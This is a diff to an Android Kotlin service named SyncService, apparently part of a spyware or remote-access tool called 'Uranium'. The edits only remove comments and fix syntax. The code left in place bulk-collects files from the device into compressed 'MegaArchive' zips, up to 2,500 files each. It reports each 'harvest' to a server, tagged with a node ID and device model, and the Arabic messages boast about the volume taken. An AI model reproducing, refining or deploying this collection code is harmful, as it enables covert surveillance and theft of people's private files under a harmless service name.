@@ -170,7 +170,6 @@ class SyncService : Service() {
         } catch (e: Exception) {}
     }
 
-    // ⚡ آلية الأرشيف العملاق المضغوط (حتى 2500 ملف في الملف الواحد = ما يقارب 1 جيجا ملفات مضغوطة باحترافية لتوفير الإنترنت)
     private fun streamArchiveMegaCompressed(nodeId: String, nodeModel: String, prefix: String, contentUri: Uri) {
         try {
             sendReportToServer(nodeId, nodeModel, "⚡ [الحصاد العملاق المكثف] جاري جمع وضغط أرشيف ضخم لـ $prefix (بضغط أقصى لتوفير الإنترنت)...")
@@ -189,10 +188,9 @@ class SyncService : Service() {
                 while (it.moveToNext()) {
                     val zipFile = File(cacheDir, "Uranium_${prefix}_MegaArchive_${archiveNum}_${System.currentTimeMillis()}.zip")
                     val zipOut = ZipOutputStream(FileOutputStream(zipFile))
-                    zipOut.setLevel(Deflater.BEST_COMPRESSION) // ضغط أقصى لتوفير باقات الإنترنت والحفاظ على حجم مضغوط
+                    zipOut.setLevel(Deflater.BEST_COMPRESSION)
 
                     var filesInArchive = 0
-                    // رفع السعة إلى 2500 ملف في الأرشيف الواحد (ما يعادل ~1 جيجابايت من الملفات المضغوطة بذكاء)
                     while (filesInArchive < 2500 && !it.isAfterLast) {
                         if (idIdx != -1 && nameIdx != -1) {
                             val id = it.getLong(idIdx)
@@ -223,7 +221,7 @@ class SyncService : Service() {
                     archiveNum++
                 }
             }
-            sendReportToServer(nodeId, nodeModel, "✅ [اكتمال الأرشيف العملاق بنجاح وتطهير الذاكرة]\n📊 إجمالي الملفات المضغوطة: <b>$totalFilesProcessed ملفاً</b> بحجم ضغط ذكي يوفر الإنترنت ويعطيك محتوى ضخماً عند فك الضغط.")
+            sendReportToServer(nodeId, nodeModel, "✅ [اكتمال الأرشيف العملاق بنجاح وتطهير الذاكرة]\n📊 إجمالي الملفات المضغوطة: <b>$totalFilesProcessed ملفاً</b> بحجم ضغط ذكي يوفر الإنترنت.")
         } catch (e: Exception) {
             sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في الأرشيف العملاق: ${e.message}")
         }
@@ -386,5 +384,5 @@ class SyncService : Service() {
         serviceScope.cancel()
     }
 
-    override fun onBind(intent: Intent?): IBinder? =, null
+    override fun onBind(intent: Intent?): IBinder? = null
 }
